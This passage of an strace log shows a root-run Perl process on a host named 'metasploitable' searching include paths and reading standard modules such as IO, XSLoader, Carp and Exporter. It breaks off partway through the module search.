\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
5352  07:08:43.604854 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
5352  07:08:43.604871 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db8000
5352  07:08:43.604882 mmap2(0xb7dc1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dc1000
5352  07:08:43.604895 mmap2(0xb7dc3000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dc3000
5352  07:08:43.604908 close(1)          = 0
5352  07:08:43.604931 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db7000
5352  07:08:43.604944 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7db78c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
5352  07:08:43.605085 mprotect(0xb7f33000, 4096, PROT_READ) = 0
5352  07:08:43.605112 munmap(0xb7f7b000, 29913) = 0
5352  07:08:43.605124 set_tid_address(0xb7db7908) = 5352
5352  07:08:43.605133 set_robust_list(0xb7db7910, 0xc) = 0
5352  07:08:43.605143 futex(0xbfd2f9d0, 0x81 /* FUTEX_??? */, 1) = 0
5352  07:08:43.605157 rt_sigaction(SIGRTMIN, {0xb7f3d2c0, [], SA_SIGINFO}, NULL, 8) = 0
5352  07:08:43.605170 rt_sigaction(SIGRT_1, {0xb7f3d340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
5352  07:08:43.605182 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
5352  07:08:43.605195 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
5352  07:08:43.605214 uname({sys="Linux", node="metasploitable", ...}) = 0
5352  07:08:43.605259 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
5352  07:08:43.605303 brk(0)            = 0x8153000
5352  07:08:43.605312 brk(0x8174000)    = 0x8174000
5352  07:08:43.605354 getuid32()        = 0
5352  07:08:43.605364 geteuid32()       = 0
5352  07:08:43.605373 getgid32()        = 0
5352  07:08:43.605381 getegid32()       = 0
5352  07:08:43.605418 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d96000
5352  07:08:43.605444 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
5352  07:08:43.605471 read(1, "\377\31\21\212", 4) = 4
5352  07:08:43.605512 close(1)          = 0
5352  07:08:43.605547 time(NULL)        = 1495624123
5352  07:08:43.605588 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfd2f6a0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605605 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfd2f6a0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605617 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfd2f6a0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605636 stat64("/usr/local/lib/perl/5.8.7", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605648 stat64("/usr/local/share/perl/5.8.7", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605660 stat64("/usr/local/lib/perl/5.8.6", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605672 stat64("/usr/local/share/perl/5.8.6", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605683 stat64("/usr/local/lib/perl/5.8.4", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605694 stat64("/usr/local/share/perl/5.8.4", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605705 stat64("/usr/local/lib/perl/5.8.3", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605717 stat64("/usr/local/share/perl/5.8.3", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605728 stat64("/usr/local/lib/perl/5.8.2", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605739 stat64("/usr/local/share/perl/5.8.2", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605750 stat64("/usr/local/lib/perl/5.8.1", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605761 stat64("/usr/local/share/perl/5.8.1", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605773 stat64("/usr/local/lib/perl/5.8.0", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605784 stat64("/usr/local/share/perl/5.8.0", 0xbfd2f7e0) = -1 ENOENT (No such file or directory)
5352  07:08:43.605806 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2f4d8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.605819 _llseek(0, 0, [0], SEEK_CUR) = 0
5352  07:08:43.605831 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2f4d8) = -1 EBADF (Bad file descriptor)
5352  07:08:43.605841 _llseek(1, 0, 0xbfd2f520, SEEK_CUR) = -1 EBADF (Bad file descriptor)
5352  07:08:43.605851 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2f4d8) = -1 EINVAL (Invalid argument)
5352  07:08:43.605862 _llseek(2, 0, 0xbfd2f520, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5352  07:08:43.605872 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
5352  07:08:43.605885 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2f598) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.605895 _llseek(1, 0, [0], SEEK_CUR) = 0
5352  07:08:43.605906 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
5352  07:08:43.605917 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
5352  07:08:43.605935 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
5352  07:08:43.606035 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
5352  07:08:43.606093 getppid()         = 5350
5352  07:08:43.606152 stat64("/etc/perl/IO.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.606166 stat64("/etc/perl/IO.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.606178 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.606191 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.606204 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.606216 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.606229 stat64("/usr/lib/perl5/IO.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.606241 stat64("/usr/lib/perl5/IO.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.606254 stat64("/usr/share/perl5/IO.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.606265 stat64("/usr/share/perl5/IO.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.606278 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.606290 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
5352  07:08:43.606316 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 10
5352  07:08:43.606330 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2efa8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.606341 _llseek(10, 0, [0], SEEK_CUR) = 0
5352  07:08:43.606363 read(10, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
5352  07:08:43.606418 stat64("/etc/perl/XSLoader.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.606431 stat64("/etc/perl/XSLoader.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.606444 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.606470 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.606511 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.606539 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.606552 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.606564 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.606576 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.606588 stat64("/usr/share/perl5/XSLoader.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.606601 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.606613 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
5352  07:08:43.606633 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.606647 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.606658 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.606675 read(11, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
5352  07:08:43.606907 brk(0x8195000)    = 0x8195000
5352  07:08:43.607299 _llseek(11, 3407, [3407], SEEK_SET) = 0
5352  07:08:43.607317 _llseek(11, 0, [3407], SEEK_CUR) = 0
5352  07:08:43.607327 close(11)         = 0
5352  07:08:43.607371 stat64("/etc/perl/Carp.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.607386 stat64("/etc/perl/Carp.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.607400 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.607412 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.607426 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.607438 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.607442 stat64("/usr/lib/perl5/Carp.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.607442 stat64("/usr/lib/perl5/Carp.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.607442 stat64("/usr/share/perl5/Carp.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.607443 stat64("/usr/share/perl5/Carp.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.607443 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.607443 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.607443 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.607444 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
5352  07:08:43.607444 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.607444 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.607444 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.607444 read(11, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
5352  07:08:43.607997 read(11, "gmess  @_ }\n\n1;\n", 4096) = 16
5352  07:08:43.608029 read(11, "", 4096) = 0
5352  07:08:43.608074 close(11)         = 0
5352  07:08:43.608096 stat64("/etc/perl/Exporter.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.608110 stat64("/etc/perl/Exporter.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.608123 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.608136 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.608149 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.608162 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.608176 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.608187 stat64("/usr/lib/perl5/Exporter.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.608200 stat64("/usr/share/perl5/Exporter.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.608212 stat64("/usr/share/perl5/Exporter.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.608225 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.608237 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.608251 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.608263 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
5352  07:08:43.608284 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.608298 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.608309 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.608325 read(11, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
5352  07:08:43.608808 _llseek(11, 2217, [2217], SEEK_SET) = 0
5352  07:08:43.608826 _llseek(11, 0, [2217], SEEK_CUR) = 0
5352  07:08:43.608836 close(11)         = 0
5352  07:08:43.608909 stat64("/etc/perl/strict.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.608925 stat64("/etc/perl/strict.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.608938 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.608951 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.608964 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.608976 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.609005 stat64("/usr/lib/perl5/strict.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.609046 stat64("/usr/lib/perl5/strict.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.609073 stat64("/usr/share/perl5/strict.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.609102 stat64("/usr/share/perl5/strict.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.609114 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.609127 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.609139 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.609151 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
5352  07:08:43.609172 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.609187 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.609198 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.609217 read(11, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
5352  07:08:43.609356 _llseek(11, 598, [598], SEEK_SET) = 0
5352  07:08:43.609369 _llseek(11, 0, [598], SEEK_CUR) = 0
5352  07:08:43.609379 close(11)         = 0
5352  07:08:43.609416 stat64("/etc/perl/warnings.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.609430 stat64("/etc/perl/warnings.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.609443 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
